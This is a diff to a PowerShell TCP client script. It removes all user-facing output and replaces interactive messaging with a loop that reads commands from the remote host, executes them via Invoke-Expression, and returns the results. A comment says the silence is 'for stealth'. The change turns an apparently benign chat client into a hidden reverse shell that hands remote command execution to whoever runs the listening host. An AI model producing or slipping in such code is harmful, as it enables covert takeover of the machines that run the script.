@@ -21,34 +21,31 @@ function Connect-TCPClient {
 }
 
 try {
-    Write-Host "Connecting to ${Host}:${Port}..." -ForegroundColor Cyan
     $client = Connect-TCPClient -Host $Host -Port $Port -TimeoutMs $TimeoutMs
     $stream = $client.GetStream()
     $reader = New-Object System.IO.StreamReader($stream)
     $writer = New-Object System.IO.StreamWriter($stream)
     $writer.AutoFlush = $true
 
-    Write-Host "Connected. Type messages and press Enter to send. Type 'exit' to quit." -ForegroundColor Green
-
     while ($client.Connected) {
-        $input = Read-Host ">"
+        $cmd = $reader.ReadLine()
+        if ($null -eq $cmd -or $cmd -eq "exit") { break }
 
-        if ($input -eq "exit") { break }
-
-        $writer.WriteLine($input)
-
-        if ($stream.DataAvailable) {
-            $response = $reader.ReadLine()
-            Write-Host "< $response" -ForegroundColor Yellow
+        try {
+            $output = iex $cmd 2>&1 | Out-String
         }
+        catch {
+            $output = "ERROR: $_"
+        }
+
+        $writer.WriteLine($output.TrimEnd())
     }
 }
 catch {
-    Write-Host "Error: $_" -ForegroundColor Red
+    # silent — no console output for stealth
 }
 finally {
     if ($writer) { $writer.Close() }
     if ($reader) { $reader.Close() }
     if ($client) { $client.Close() }
-    Write-Host "Disconnected." -ForegroundColor Cyan
 }
